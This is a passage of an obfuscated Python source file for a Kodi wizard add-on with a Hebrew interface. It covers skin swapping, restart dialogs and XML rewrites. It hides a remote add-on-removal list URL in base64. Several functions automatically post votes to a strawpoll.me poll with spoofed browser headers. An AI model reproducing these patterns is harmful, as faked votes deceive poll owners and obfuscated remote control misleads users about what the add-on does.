# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	O000OO0000O0O0OOO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OOOOO0OOOOO0OO0O0 =[];OO0O0O000O0OOOO00 =[]#line:266
	for O0000OO0OO0OO0OO0 in sorted (O000OO0000O0O0OOO ,key =lambda O0O0O00O0O0OO0OO0 :O0O0O00O0O0OO0OO0 ):#line:267
		O0000O00O00OO0OOO =os .path .split (O0000OO0OO0OO0OO0 [:-1 ])[1 ]#line:268
		O0O0OOOO0OO0OO0OO =os .path .join (O0000OO0OO0OO0OO0 ,'addon.xml')#line:269
		if os .path .exists (O0O0OOOO0OO0OO0OO ):#line:270
			O0OOOO0O0OO0O0OO0 =open (O0O0OOOO0OO0OO0OO )#line:271
			OO0OOOO0000OOO00O =O0OOOO0O0OO0O0OO0 .read ()#line:272
			OO00OOOOO000O0OO0 =parseDOM2 (OO0OOOO0000OOO00O ,'addon',ret ='id')#line:273
			OOO0OOOOO000OOO00 =O0000O00O00OO0OOO if len (OO00OOOOO000O0OO0 )==0 else OO00OOOOO000O0OO0 [0 ]#line:274
			try :#line:275
				OO0O0000O0OO0OO0O =xbmcaddon .Addon (id =OOO0OOOOO000OOO00 )#line:276
				OOOOO0OOOOO0OO0O0 .append (OO0O0000O0OO0OO0O .getAddonInfo ('name'))#line:277
				OO0O0O000O0OOOO00 .append (OOO0OOOOO000OOO00 )#line:278
			except :#line:279
				pass #line:280
	OOO00OOOO0O0000O0 =[];O0O0000O00O00O000 =0 #line:281
	OO0OOO0OO0OO00000 =["Current Skin -- %s"%currSkin ()]+OOOOO0OOOOO0OO0O0 #line:282
	O0O0000O00O00O000 =DIALOG .select ("Select the Skin you want to swap with.",OO0OOO0OO0OO00000 )#line:283
	if O0O0000O00O00O000 ==-1 :return #line:284
	else :#line:285
		OO0OO0O0OO000O0O0 =(O0O0000O00O00O000 -1 )#line:286
		OOO00OOOO0O0000O0 .append (OO0OO0O0OO000O0O0 )#line:287
		OO0OOO0OO0OO00000 [O0O0000O00O00O000 ]="%s"%(OOOOO0OOOOO0OO0O0 [OO0OO0O0OO000O0O0 ])#line:288
	if OOO00OOOO0O0000O0 ==None :return #line:289
	for O0O0000O0OOOOOO00 in OOO00OOOO0O0000O0 :#line:290
		swapSkins (OO0O0O000O0OOOO00 [O0O0000O0OOOOOO00 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (O0O0OO0O000O0O0O0 ,title ="Error"):#line:295
	O0O000000OOO0OO0O ='lookandfeel.skin'#line:296
	O0000O00O0OO0OO0O =O0O0OO0O000O0O0O0 #line:297
	OO0OOOOOOOOOOOO0O =getOld (O0O000000OOO0OO0O )#line:298
	OOO00OO0OOO0OO00O =O0O000000OOO0OO0O #line:299
	setNew (OOO00OO0OOO0OO00O ,O0000O00O0OO0OO0O )#line:300
	OO00OO0O000O0OOOO =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OO0O000O0OOOO <100 :#line:302
		OO00OO0O000O0OOOO +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O0OO0OO0O00O00OOO ):#line:309
	try :#line:310
		O0OO0OO0O00O00OOO ='"%s"'%O0OO0OO0O00O00OOO #line:311
		O0000O000O0OOO0OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OO0OO0O00O00OOO )#line:312
		O00OOOO00OOOO0000 =xbmc .executeJSONRPC (O0000O000O0OOO0OO )#line:314
		O00OOOO00OOOO0000 =simplejson .loads (O00OOOO00OOOO0000 )#line:315
		if O00OOOO00OOOO0000 .has_key ('result'):#line:316
			if O00OOOO00OOOO0000 ['result'].has_key ('value'):#line:317
				return O00OOOO00OOOO0000 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OO0OO0OO00000OO0O ,OO00O000O000OO000 ):#line:324
	try :#line:325
		OO0OO0OO00000OO0O ='"%s"'%OO0OO0OO00000OO0O #line:326
		OO00O000O000OO000 ='"%s"'%OO00O000O000OO000 #line:327
		OO0OOO00OO0O0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OO0OO00000OO0O ,OO00O000O000OO000 )#line:328
		O0OOO00000O0OOO00 =xbmc .executeJSONRPC (OO0OOO00OO0O0O0O0 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O0O0O00O0OOO00OO0 =xbmcgui .DialogProgress ()#line:339
			O0O0O00O0OOO00OO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O0O0O00O0OOO00OO0 .update (0 )#line:343
			for O0O0000OOOOOO0OOO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O0O0O00O0OOO00OO0 .update (int ((5 -O0O0000OOOOOO0OOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O0000OOOOOO0OOO ),'')#line:346
				if O0O0O00O0OOO00OO0 .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O0O0O00O0OOO00OO0 =xbmcgui .DialogProgress ()#line:352
			O0O0O00O0OOO00OO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O0O0O00O0OOO00OO0 .update (0 )#line:356
			for O0O0000OOOOOO0OOO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O0O0O00O0OOO00OO0 .update (int ((5 -O0O0000OOOOOO0OOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O0000OOOOOO0OOO ),'')#line:359
				if O0O0O00O0OOO00OO0 .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    OOOO0OOOOOO00OO0O ='18773068'#line:372
    O00O0O00OO0O0O0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO0OOOOOO00OO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OO0OOOO0000O0OOO0 ='145273320'#line:386
    OOOOO000000OOOO00 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        OOO0OO00OO00OO00O =OO0OOOO0000O0OOO0 #line:389
    else :#line:390
        OOO0OO00OO00OO00O =OOOOO000000OOOO00 #line:391
    OO0000OOOO0O00OO0 ={'options':OOO0OO00OO00OO00O }#line:395
    O0O00000OO000OOOO =requests .post ('https://www.strawpoll.me/'+OOOO0OOOOOO00OO0O ,headers =O00O0O00OO0O0O0O0 ,data =OO0000OOOO0O00OO0 )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OOOO0O0O0000OO00O ='18773068'#line:401
        O0O0OO00O0OOOO00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO0O0O0000OO00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O000O00O0000O0000 ='145273320'#line:415
        O0OOOOOO00OO0OO00 ={'options':O000O00O0000O0000 }#line:421
        OOOO0O000O00000O0 =requests .post ('https://www.strawpoll.me/'+OOOO0O0O0000OO00O ,headers =O0O0OO00O0OOOO00O ,data =O0OOOOOO00OO0OO00 )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        OO0O00OO0OOOOOO00 ='18773068'#line:428
        OO00OO00000O0OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O00OO0OOOOOO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O00O0O0OO00OOOO00 ='145273321'#line:442
        O0O000O00O000OO00 ={'options':O00O0O0OO00OOOO00 }#line:448
        O00O0O0O00O0000OO =requests .post ('https://www.strawpoll.me/'+OO0O00OO0OOOOOO00 ,headers =OO00OO00000O0OOOO ,data =O0O000O00O000OO00 )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    O00OO0OOOO000O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (O00OO0OOOO000O0OO ,'r')as O0O00O00O0OOOO000 :#line:459
      O0OOO0OO0OO0OOOOO =O0O00O00O0OOOO000 .read ()#line:460
    O0OOO0OO0OO0OOOOO =O0OOO0OO0OO0OOOOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (O00OO0OOOO000O0OO ,'w')as O0O00O00O0OOOO000 :#line:510
      O0O00O00O0OOOO000 .write (O0OOO0OO0OO0OOOOO )#line:511
    O00OO0OOOO000O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (O00OO0OOOO000O0OO ,'r')as O0O00O00O0OOOO000 :#line:518
      O0OOO0OO0OO0OOOOO =O0O00O00O0OOOO000 .read ()#line:519
    O0OOO0OO0OO0OOOOO =O0OOO0OO0OO0OOOOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
